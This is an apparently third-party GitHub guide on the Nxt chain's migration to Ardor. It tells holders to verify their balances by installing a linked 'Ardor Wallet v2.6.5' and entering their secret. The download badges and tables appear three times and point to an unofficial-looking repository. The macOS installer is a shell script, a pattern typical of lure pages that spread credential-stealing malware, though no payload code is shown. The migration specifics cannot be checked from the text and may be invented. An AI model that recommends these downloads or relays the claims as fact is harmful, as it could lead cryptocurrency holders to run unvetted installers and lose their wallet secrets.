![Ardor Wallet guide](assets/banner-article.png)

# The Nxt migration to Ardor, step by step for holders

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Nxt migration needed no action from holders: balances moved automatically when the child chain started on Ardor at block 4,333,333 on 1 February 2026, and the same secret opens the same account in the Ardor wallet. What remains is verification - confirming that the balance you see matches the balance you held at the final Nxt block.

## What the migration did

Nxt stopped generating blocks at block 6,000,000 on 17 January 2026. Two weeks later the Nxt [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) went live on Ardor, carrying the account balances across. The account ID, the secret and the address derivation stayed the same, because they were never chain-specific in the first place.

That is why there is no swap interface to visit and no token contract to interact with. Anyone offering to migrate [NXT](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md) for you is offering a service that does not exist, usually for a fee, usually with your secret as the price.

## Verify your balance

1. Find the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) you held at the final Nxt block. A record from before 17 January 2026 works; a screenshot, an old export or a note is enough.
2. Install the current [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) release and let it reach the chain.
3. Enter your secret on the passphrase tab and open the account.
4. Select the Nxt child chain.
5. Compare the balance with the figure from step one.

The platform's own migration notes ask holders to do exactly this comparison, and it is the only check that needs doing. A match means the migration carried everything. A mismatch is worth investigating before you move anything, and the first thing to rule out is a chain selector pointing at the parent chain instead of the child chain.

## If the balance is missing

Work through the causes in order, because they are far more common than an actual migration failure.

| Symptom | Likely cause | Check |
|---|---|---|
| Zero balance on the parent chain | Wrong chain selected | Switch to the Nxt child chain |
| Zero balance everywhere | Sync unfinished, or a light client reading a lagging node | Wait, restart, or check the account on an explorer |
| A different address entirely | One character differs in the secret | Re-enter by hand from the written copy |
| Balance visible but cannot send | Read-only account tab | Use the passphrase tab |

An account that has been idle for years deserves one extra step: announce the public key. The platform records the key with an outgoing transaction or with a receiving transaction that carries it, and an unannounced key leaves an account exposed to a different secret that maps to the same short account ID.

## What carried over and what did not

Balances carried over automatically. Transaction history did not: the old chain's explorer stops at its final block, so an old transaction hash does not resolve on the new one, and a statement built from that history has to cite the old explorer rather than the current chain.

Aliases, assets and other account records are the part a holder should verify rather than assume. The child chain runs on Ardor with the platform's feature set beside it, which is not the same thing as a byte-for-byte copy of every record the old chain held. Open the account, read each section, and compare against what you know you had.

## Three misconceptions worth clearing

The first is that a claim or swap was required. It was not: the migration was automatic, and no interface ever needed to be visited. The second is that a specific wallet version was needed. The platform's notes state no version requirement, and the current release is the one to install for every other reason too. The third is that the NXT token stopped existing. It is the child chain's token now, readable with the same secret.

Each misconception leads to the same expensive mistake: a holder who believes a step is missing goes looking for a service that offers to perform it, and that service asks for the secret. There is no such step and no such service.

## Exchange handling

Exchanges set their own policy for deposits, withdrawals and crediting around a migration, and the platform's migration notes do not speak for them. If NXT sits on an exchange, the exchange's own announcement is the only authoritative answer about timing and about which chain it credits.

What you can control is the withdrawal address and the chain you withdraw on. Send a small amount first, confirm it arrives in the wallet you can open yourself, and only then move the rest. That rule holds whether or not a migration is involved.

## What to do with the account afterwards

Migrating is also a good moment to fix the things that made the account fragile. Confirm the written backup opens the account, since an account that sat idle for years is exactly where a miswritten word goes unnoticed. Announce the public key. And if the balance is large enough that a single machine feels like too much risk, move part of it to an account you use less often.

The old chain's block explorer stops at the final block, so an old transaction hash will not resolve on the new chain's explorer. That is expected: the balance moved, the history did not.

## FAQ

### Did I need to claim my NXT before the migration?

No. Balances migrated automatically, and there was no claim window or swap step.

### Was a specific wallet version required?

The platform's migration notes state no wallet version requirement. Install the current release, which is the version to use for every other reason as well.

### Where do I see my NXT now?

In the Ardor wallet, with the Nxt child chain selected, using the same secret as before.

### What happens to Nxt assets and aliases?

The child chain was set up with the platform's features beside it, including aliases, the asset exchange, the coin exchange and the data cloud. Verify what your account holds by opening it and reading each section rather than assuming a one-to-one mapping of every old record.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What happened to the Nxt chain, and where the token is now](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md)
- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [Where to store ARDR: wallet, hardware or exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/store-ardr-in-the-ardor-wallet.md)
- [Announce a public key in the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
